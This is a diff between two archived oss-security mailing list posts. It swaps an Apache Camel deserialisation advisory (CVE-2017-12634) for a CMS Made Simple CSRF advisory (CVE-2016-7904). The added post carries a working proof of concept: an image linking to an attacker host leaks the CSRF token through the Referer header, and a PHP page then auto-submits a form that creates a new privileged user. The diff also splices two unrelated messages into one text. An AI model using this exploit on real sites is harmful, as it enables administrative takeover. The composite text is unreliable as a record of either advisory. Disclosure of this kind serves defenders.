@@ -1,43 +1,76 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/11/15/2
-Message-ID: <201650652.439065.1510734891717@mail.yahoo.com>
-Date: Wed, 15 Nov 2017 08:34:51 +0000 (UTC)
-From: Andrea Cosentino <ancosen1985@...oo.com>
-To: Dev <dev@...el.apache.org>, Users <users@...el.apache.org>,  Man Yue Mo <mmo@...mle.com>,  "security@...che.org" <security@...che.org>,  "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-Subject: [SECURITY] New security advisory CVE-2017-12634 released for Apache Camel
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/16/1
+Message-ID: <15f7b5fc.102.159a510a8eb.Coremail.hongkun.zeng@dbappsecurity.com.cn>
+Date: Mon, 16 Jan 2017 10:17:29 +0800 (GMT+08:00)
+From: "Hongkun Zeng" <hongkun.zeng@...ppsecurity.com.cn>
+To: oss-security <oss-security@...ts.openwall.com>
+Subject: CVE-2016-7904: CMS Made Simple <= 2.1.5 CSRF
 Content-Type: text/plain; charset=utf-8
 
-A new security advisory has been released for Apache Camel, that is fixed in
-the recent 2.19.4 and 2.20.1 releases:
+Vulnerability: CVE-2016-7904: CMS Made Simple <= 2.1.5 CSRF
+CVE: CVE-2016-7904
+Discovered by: Hongkun Zeng (http://www.dbappsecurity.com.cn/)
 
- CVE-2017-12634: Apache Camel's Castor unmarshalling operation is vulnerableto Remote Code Execution attacks
 
-The full text of the advisory is the following:
+CMS Made Simple (CMSMS) is a free, open source (GPL) content management system (CMS) to provide developers, programmers and site owners a web-based development and administration area.
 
-CVE-2017-12634: Apache Camel's Castor unmarshalling operation is vulnerable to Remote Code Execution attacks 
 
-Severity: MEDIUM
+This is a security issue in CMSMS. Low privilege users were able to gain control of an administrative session through a CSRF attack.
 
-Vendor: The Apache Software Foundation
 
-Versions Affected: Camel 2.19.0 to 2.19.3 and Camel 2.20.0. The unsupported Camel 2.x (2.18 and earlier) versions may be also affected.
+Add article and insert image with link http://attacker/csrfpoc.php, and the referer would leak the users' csrf token.
 
-Description: Apache Camel's camel-castor component is vulnerable to Java objectde-serialisation vulnerability. De-serializing untrusted data can lead to security flaws.
 
-Mitigation: 2.19.x users should upgrade to 2.19.4, 2.20.0 users should upgrade to 2.20.1. 
+POC:
+```
+//File: csrfpoc.php
+<?php
+session_start();
 
-The JIRA ticket: https://issues.apache.org/jira/browse/CAMEL-11929 refers to the various commits that resovoled the issue, and have more details.
 
-Credit: This issue was discovered by Man Yue Mo <mmo at semmle dot com> from Semmle/lgtm.com.On behalf of the Apache Camel PMC
+if(!isset($_SERVER['HTTP_REFERER']) && !isset($_SESSION['_sk_']))
+exit;
 
-On behalf of the Apache Camel PMC
+
+if(isset($_SERVER['HTTP_REFERER'])){
+$parsed_url = parse_url($_SERVER['HTTP_REFERER']);
+$query = isset($parsed_url['query']) ? '?' . $parsed_url['query'] : '';
+parse_str("$query",$arr);
+if(isset($arr['_sk_'])){
+$_SESSION['_sk_'] = $arr['_sk_'];
+}
+}
+if(!isset($_SESSION['_sk_']))
+exit;
+?>
+
+
+<form action='http://localhost:8012/admin/adduser.php' method='POST' id='form' enctype='multipart/form-data'>
+<input type="text" name="_sk_" value="<?php echo $_SESSION['_sk_'];?>" />
+<input type="text" name="user" value="test" />
+<input type="text" name="password" value="123456" />
+<input type="text" name="passwordagain" value="123456" />
+<input type="text" name="firstname" value="" />
+<input type="text" name="lastname" value="" />
+<input type="text" name="email" value="" />
+<input type="text" name="active" value="1" />
+<input type="text" name="sel_groups[]" value="1" />
+<input type="text" name="sel_groups[]" value="2" />
+<input type="text" name="sel_groups[]" value="3" />
+<input type="text" name="copyusersettings" value="-1" />
+<input type="text" name="submit" value="submit" />
+</form>
+<script> document.createElement('form').submit.call(document.getElementById('form')); </script> 
+```
+
+
+Ref:
+http://dev.cmsmadesimple.org/project/changelog/5392
+
 
 --
-Andrea Cosentino 
-----------------------------------
-Apache Camel PMC Member
-Apache Karaf Committer
-Apache Servicemix PMC Member
-Email: ancosen1985@...oo.com
-Twitter: @oscerd2
-Github: oscerd
+
+Best Regards,
+Hongkun Zeng
+---------------------------------------------------
+hongkun.zeng (at) dbappsecurity.com.cn
